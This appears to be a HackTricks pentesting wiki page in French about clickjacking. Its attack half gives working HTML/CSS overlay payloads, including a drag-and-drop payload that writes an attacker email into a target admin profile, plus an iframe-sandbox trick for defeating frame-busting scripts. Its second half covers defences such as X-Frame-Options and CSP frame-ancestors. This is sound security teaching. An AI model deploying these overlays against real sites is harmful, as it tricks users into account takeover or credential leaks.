# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Qu'est-ce que le Clickjacking

Dans une attaque de clickjacking, un **utilisateur** est **trompé** pour **cliquer** sur un **élément** d'une page web qui est soit **invisible** soit déguisé en un autre élément. Cette manipulation peut entraîner des conséquences non souhaitées pour l'utilisateur, comme le téléchargement de malware, la redirection vers des pages web malveillantes, la fourniture de credentials ou d'informations sensibles, des transferts d'argent, ou l'achat en ligne de produits.

### Astuce de pré-remplissage des formulaires

Il est parfois possible de **remplir la valeur des champs d'un formulaire en utilisant des GET parameters lors du chargement d'une page**. Un attaquant peut abuser de ce comportement pour remplir un formulaire avec des données arbitraires et envoyer le clickjacking payload afin que l'utilisateur appuie sur le bouton Submit.

### Remplir un formulaire avec Drag\&Drop

Si vous avez besoin que l'utilisateur **remplisse un formulaire** mais que vous ne voulez pas lui demander directement d'écrire des informations spécifiques (comme l'email ou un mot de passe spécifique que vous connaissez), vous pouvez simplement lui demander de **Drag\&Drop** quelque chose qui écrira vos données contrôlées comme dans [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Payload de base
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload en plusieurs étapes
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si vous avez identifié une **XSS** qui nécessite qu'un utilisateur clique sur un élément pour **déclencher** le XSS et que la page est **vulnérable au Clickjacking**, vous pouvez en abuser pour tromper l'utilisateur afin qu'il clique sur le bouton/le lien.\
Exemple:\
Vous avez trouvé une **self XSS** dans certains détails privés du compte (détails que **vous seul pouvez définir et lire**). La page contenant le **form** pour définir ces détails est **vulnérable** au **Clickjacking** et vous pouvez **préremplir** le **form** avec les paramètres GET.\
Un attaquant pourrait préparer une attaque de **Clickjacking** contre cette page **préremplissant** le **form** avec le **payload XSS** et **tromper** l'**utilisateur** pour qu'il **soumette** le formulaire. Ainsi, **lorsque le formulaire est soumis** et que les valeurs sont modifiées, **l'utilisateur exécutera le XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), cette technique demande à la victime de double-cliquer sur un bouton d'une page contrôlée placée à un endroit précis, et utilise les différences de timing entre les événements mousedown et onclick pour charger la page victime pendant le double-clic afin que la **victime clique en réalité sur un bouton légitime dans la page victime**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Cette technique permet de tromper l'utilisateur pour qu'il clique en un seul endroit de la page victime en contournant toutes les protections contre le Clickjacking. L'attaquant doit donc trouver des **actions sensibles qui peuvent être effectuées avec un seul clic, comme les invites OAuth acceptant des permissions**.

### Extensions de navigateur: DOM-based autofill clickjacking

À part l'iframing des pages victimes, les attaquants peuvent cibler les éléments UI des extensions de navigateur qui sont injectés dans la page. Les gestionnaires de mots de passe affichent des listes déroulantes d'autofill près des champs focalisés ; en focalisant un champ contrôlé par l'attaquant et en masquant/occluant le dropdown de l'extension (astuces d'opacité/overlay/couche supérieure), un clic contraint de l'utilisateur peut sélectionner un élément stocké et remplir des données sensibles dans des champs contrôlés par l'attaquant. Cette variante ne nécessite aucune exposition via iframe et fonctionne entièrement via manipulation DOM/CSS.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Stratégies pour atténuer le Clickjacking

### Défenses côté client

Les scripts exécutés côté client peuvent effectuer des actions pour prévenir le Clickjacking :

- S'assurer que la fenêtre de l'application est la fenêtre principale ou top.
- Rendre toutes les frames visibles.
- Empêcher les clics sur des frames invisibles.
- Détecter et alerter les utilisateurs des tentatives potentielles de Clickjacking.

Cependant, ces scripts de frame-busting peuvent être contournés :

- **Browsers' Security Settings :** Certains navigateurs peuvent bloquer ces scripts en fonction de leurs paramètres de sécurité ou en l'absence de support JavaScript.
- **HTML5 iframe sandbox Attribute :** Un attaquant peut neutraliser les scripts de frame buster en définissant l'attribut sandbox avec les valeurs allow-forms ou allow-scripts sans allow-top-navigation. Cela empêche l'iframe de vérifier si elle est la fenêtre top, par exemple,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The allow-forms and allow-scripts values enable actions within the <iframe> while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like allow-same-origin and allow-modals might be necessary, depending on the attack type. Les messages de la console du navigateur peuvent indiquer quelles permissions autoriser.

### Défenses côté serveur

#### X-Frame-Options

The **X-Frame-Options HTTP response header** informe les navigateurs sur la légitimité du rendu d'une page dans un <frame> ou un <iframe>, aidant à prévenir le Clickjacking :

- X-Frame-Options: deny - No domain can frame the content.
- X-Frame-Options: sameorigin - Only the current site can frame the content.
- X-Frame-Options: allow-from https://trusted.com - Only the specified 'uri' can frame the page.
- Note the limitations: if the browser doesn't support this directive, it might not work. Some browsers prefer the CSP frame-ancestors directive.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** est la méthode recommandée pour la protection contre le Clickjacking :

- frame-ancestors 'none' - Similar to X-Frame-Options: deny.
- frame-ancestors 'self' - Similar to X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Similar to X-Frame-Options: allow-from.

For instance, the following CSP only allows framing from the same domain:

Content-Security-Policy: frame-ancestors 'self';

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) avec child-src et frame-src

**Content Security Policy (CSP)** est une mesure de sécurité qui aide à prévenir le Clickjacking et d'autres attaques d'injection de code en spécifiant quelles sources le navigateur doit autoriser à charger du contenu.

#### frame-src Directive

- Defines valid sources for frames.
- More specific than the default-src directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Cette politique autorise les frames provenant de la même origine (self) et de https://trusted-website.com.

#### Directive child-src

- Introduite dans CSP level 2 pour définir les sources valides pour les web workers et les frames.
- Sert de solution de repli pour frame-src et worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Cette politique autorise les frames et les workers provenant de la même origine (self) ainsi que de https://trusted-website.com.

**Remarques d'utilisation :**

- Dépréciation : child-src est progressivement supprimé au profit de frame-src et worker-src.
- Comportement de repli : si frame-src est absent, child-src est utilisé comme repli pour les frames. Si les deux sont absents, default-src est utilisé.
- Définition stricte des sources : n'incluez que des sources de confiance dans les directives pour éviter toute exploitation.

#### JavaScript Frame-Breaking Scripts

Bien qu'ils ne soient pas totalement infaillibles, les JavaScript-based frame-busting scripts peuvent être utilisés pour empêcher qu'une page web soit encadrée. Exemple :
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Utilisation des Anti-CSRF Tokens

- **Validation des tokens:** Utilisez des anti-CSRF tokens dans les applications web pour garantir que les requêtes modifiant l'état sont effectuées intentionnellement par l'utilisateur et non via une page Clickjacked.

## Références

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
